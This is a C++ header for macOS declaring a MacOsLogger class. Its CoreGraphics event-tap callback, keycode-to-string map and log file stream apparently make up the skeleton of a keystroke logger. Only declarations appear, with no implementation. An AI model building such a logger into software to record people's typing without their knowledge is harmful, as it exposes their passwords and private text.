#pragma once

#if defined(__APPLE__)
#include <iostream>
#include <fstream>
#include <map>
#include <chrono>
#include <iomanip>
#include <stdexcept>
#include <sys/stat.h>
#include <CoreFoundation/CFMachPort.h>
#include <CoreGraphics/CGEvent.h>
#include <ApplicationServices/ApplicationServices.h>
#include <CoreFoundation/CFRunLoop.h>
#include <CoreFoundation/CoreFoundation.h>

class MacOsLogger
{
public:
    MacOsLogger();
    ~MacOsLogger();

    void startLogging();

private:
    void initializeKeyMap();
    static CGEventRef myCGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);

    std::string logFileName;
    std::ofstream logFile;
    std::map<CGKeyCode, std::string> keyMap;
    int counter;
    CFMachPortRef eventTap;
};
#endif
